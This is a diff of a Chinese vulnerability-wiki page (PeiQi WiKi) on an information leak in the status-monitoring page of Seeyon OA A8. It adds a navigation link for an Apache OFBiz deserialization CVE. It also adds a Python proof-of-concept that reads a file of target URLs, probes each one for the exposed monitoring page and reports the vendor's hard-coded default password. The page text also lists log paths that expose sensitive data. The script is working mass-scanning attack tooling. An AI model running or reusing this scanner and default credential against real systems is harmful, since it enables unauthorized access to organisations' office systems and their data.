@@ -1005,6 +1005,38 @@
             
         </li>
     
+        <li class="chapter " data-level="2.1.4.13" data-path="../../Web服务器漏洞/Apache/Apache OFBiz/">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache OFBiz/">
+            
+                    
+                    Apache OFBiz
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.4.13.1" data-path="../../Web服务器漏洞/Apache/Apache OFBiz/Apache OFBiz RMI反序列化漏洞 CVE-2021-26295.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache OFBiz/Apache OFBiz RMI反序列化漏洞 CVE-2021-26295.html">
+            
+                    
+                    Apache OFBiz RMI反序列化漏洞 CVE-2021-26295
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
 
             </ul>
             
@@ -3772,23 +3804,72 @@
 <h2 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;">&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h2>
 <p>&#x8BBF;&#x95EE;&#x76D1;&#x63A7;&#x9875;&#x9762;</p>
 <pre><code>http://xxx.xxx.xxx.xx/seeyon/management/status.jsp
-</code></pre><p><a href="image/zhiyuan-32.png" data-lightbox="4d41bb0e-0562-403b-bc1c-ff7588e58e13" data-title=""><img src="image/zhiyuan-32.png" alt=""></a></p>
+</code></pre><p><a href="image/zhiyuan-32.png" data-lightbox="bed59436-e4e0-4122-b8f5-40340684e413" data-title=""><img src="image/zhiyuan-32.png" alt=""></a></p>
 <p>&#x540E;&#x53F0;&#x5BC6;&#x7801;&#x4E3A; <strong>WLCCYBD@SEEYON</strong></p>
 <p>&#x767B;&#x5F55;&#x540E;&#x901A;&#x8FC7;&#x5982;&#x4E0B;url&#x83B7;&#x5F97;&#x4E00;&#x4E9B;&#x654F;&#x611F;&#x4FE1;&#x606F;</p>
 <pre><code>/seeyon/management/status.jsp
 /seeyon/logs/login.log
 /seeyon/logs/v3x.log
-</code></pre><p><a href="image/zhiyuan-33.png" data-lightbox="7b57215b-c8b6-460c-a734-e02eadd814da" data-title=""><img src="image/zhiyuan-33.png" alt=""></a></p>
-<p><a href="image/zhiyuan-34.png" data-lightbox="44972f76-0caf-4363-b2c0-c832b633422f" data-title=""><img src="image/zhiyuan-34.png" alt=""></a></p>
-<p><a href="image/zhiyuan-35.png" data-lightbox="dc990639-2f3f-4914-adef-7aee22799ca0" data-title=""><img src="image/zhiyuan-35.png" alt=""></a></p>
+</code></pre><p><a href="image/zhiyuan-33.png" data-lightbox="d4a19738-2ffd-417b-85eb-a8c556a80e6d" data-title=""><img src="image/zhiyuan-33.png" alt=""></a></p>
+<p><a href="image/zhiyuan-34.png" data-lightbox="ceae4809-be61-449f-bdf8-87d3e60d10ab" data-title=""><img src="image/zhiyuan-34.png" alt=""></a></p>
+<p><a href="image/zhiyuan-35.png" data-lightbox="6a9cd507-afed-4530-ae43-a577f8e6f1c6" data-title=""><img src="image/zhiyuan-35.png" alt=""></a></p>
 <h2 id="&#x6F0F;&#x6D1E;&#x5229;&#x7528;poc">&#x6F0F;&#x6D1E;&#x5229;&#x7528;POC</h2>
 <blockquote>
 <p>[!NOTE]</p>
 <p>&#x591A;&#x4E2A;&#x76EE;&#x6807;</p>
 </blockquote>
-<p><a href="image/zhiyuan-36.png" data-lightbox="904dd60b-b6c4-420e-9937-850bab12870f" data-title=""><img src="image/zhiyuan-36.png" alt=""></a></p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> random
+<span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">from</span> requests.packages.urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">title</span><span class="hljs-params">()</span>:</span>
+    print(<span class="hljs-string">&apos;+------------------------------------------&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[34m&#x516C;&#x4F17;&#x53F7;  : PeiQi&#x6587;&#x5E93;                                                   \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[34mVersion: &#x81F4;&#x8FDC;OA A6                                                  \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[36m&#x4F7F;&#x7528;&#x683C;&#x5F0F;:  python3 poc.py                                            \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[36mFile         &gt;&gt;&gt; ip.txt                                             \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+------------------------------------------&apos;</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_1</span><span class="hljs-params">(target_url)</span>:</span>
+    vuln_url = target_url + <span class="hljs-string">&quot;/seeyon/management/index.jsp&quot;</span>
+    headers = {
+        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,
+    }
+    <span class="hljs-keyword">try</span>:
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+        response = requests.get(url=vuln_url, headers=headers, verify=<span class="hljs-keyword">False</span>, timeout=<span class="hljs-number">5</span>)
+        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;Password&quot;</span> <span class="hljs-keyword">in</span> response.text:
+            print(<span class="hljs-string">&quot;\033[32m[o] &#x76EE;&#x6807; {} &#x5B58;&#x5728;&#x540E;&#x53F0;&#x76D1;&#x63A7;&#x5730;&#x5740;{}&#xFF0C;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#x4E3A;: WLCCYBD@SEEYON\033[0m&quot;</span>.format(target_url, vuln_url))
+        <span class="hljs-keyword">else</span>:
+            print(<span class="hljs-string">&quot;\033[31m[x] &#x76EE;&#x6807; {}&#x4E0D;&#x5B58;&#x5728;&#x6F0F;&#x6D1E; \033[0m&quot;</span>.format(target_url))
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        print(<span class="hljs-string">&quot;\033[31m[x] &#x76EE;&#x6807; {} &#x8BF7;&#x6C42;&#x5931;&#x8D25; \033[0m&quot;</span>.format(target_url))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Scan</span><span class="hljs-params">(file_name)</span>:</span>
+    <span class="hljs-keyword">with</span> open(file_name, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&apos;utf8&apos;</span>) <span class="hljs-keyword">as</span> scan_url:
+        <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> scan_url:
+            <span class="hljs-keyword">if</span> url[:<span class="hljs-number">4</span>] != <span class="hljs-string">&quot;http&quot;</span>:
+                url = <span class="hljs-string">&quot;http://&quot;</span> + url
+            url = url.strip(<span class="hljs-string">&apos;\n&apos;</span>)
+            <span class="hljs-keyword">try</span>:
+                POC_1(url)
+
+            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+                print(<span class="hljs-string">&quot;\033[31m[x] &#x8BF7;&#x6C42;&#x62A5;&#x9519; \033[0m&quot;</span>.format(e))
+                <span class="hljs-keyword">continue</span>
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
+    title()
+    file_name  = str(input(<span class="hljs-string">&quot;\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m&quot;</span>))
+    Scan(file_name)
+</code></pre>
+<p><a href="image/zhiyuan-36.png" data-lightbox="d2e9d7cd-51d1-4dfc-89d5-960e114b2a99" data-title=""><img src="image/zhiyuan-36.png" alt=""></a></p>
 <footer class="page-footer"><span class="copyright">PeiQi WiKi&#x6587;&#x5E93; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x6587;&#x4EF6;&#x66F4;&#x65B0;&#x65F6;&#x95F4;&#xFF1A;
-2021-03-21 12:35:59
+2021-03-23 12:45:19
 </span></footer>
                                 
                                 </section>
@@ -3832,7 +3913,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"致远OA A8 状态监控页面信息泄露","level":"2.6.4.6","depth":3,"next":{"title":"致远 OA A8 htmlofficeservlet RCE漏洞","level":"2.6.4.7","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA A8 htmlofficeservlet RCE漏洞.md","ref":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA A8 htmlofficeservlet RCE漏洞.md","articles":[]},"previous":{"title":"致远OA A6 setextno.jsp SQL注入漏洞","level":"2.6.4.5","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA A6 setextno.jsp SQL注入漏洞.md","ref":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA A6 setextno.jsp SQL注入漏洞.md","articles":[]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","theme-comscore","splitter","alerts","chapter-fold","code","github","favicon","accordion","-lunr","-search","search-pro","emphasize","-sharing","sharing-plus","tbfed-pagefooter","lightbox","flexible-alerts","pageview-count","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"PeiQi WiKi文库","modify_label":"文件更新时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/PeiQi0/PeiQi-WIKI"},"livereload":{},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":{},"lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"}},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"PeiQi","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"PeiQi WiKi文库","language":"zh-hans","gitbook":"*","description":"WiKi文库"},"file":{"path":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA A8 状态监控页面信息泄露.md","mtime":"2021-03-21T04:35:59.427Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-03-23T04:08:58.788Z"},"basePath":"../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"致远OA A8 状态监控页面信息泄露","level":"2.6.4.6","depth":3,"next":{"title":"致远 OA A8 htmlofficeservlet RCE漏洞","level":"2.6.4.7","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA A8 htmlofficeservlet RCE漏洞.md","ref":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA A8 htmlofficeservlet RCE漏洞.md","articles":[]},"previous":{"title":"致远OA A6 setextno.jsp SQL注入漏洞","level":"2.6.4.5","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA A6 setextno.jsp SQL注入漏洞.md","ref":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA A6 setextno.jsp SQL注入漏洞.md","articles":[]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","theme-comscore","splitter","alerts","chapter-fold","code","github","favicon","accordion","-lunr","-search","search-pro","emphasize","-sharing","sharing-plus","tbfed-pagefooter","lightbox","flexible-alerts","pageview-count","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"PeiQi WiKi文库","modify_label":"文件更新时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/PeiQi0/PeiQi-WIKI"},"livereload":{},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":{},"lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"}},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"PeiQi","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"PeiQi WiKi文库","language":"zh-hans","gitbook":"*","description":"WiKi文库"},"file":{"path":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA A8 状态监控页面信息泄露.md","mtime":"2021-03-23T04:45:19.385Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-03-23T16:08:50.887Z"},"basePath":"../../..","book":{"language":""}});
         });
     </script>
 </div>
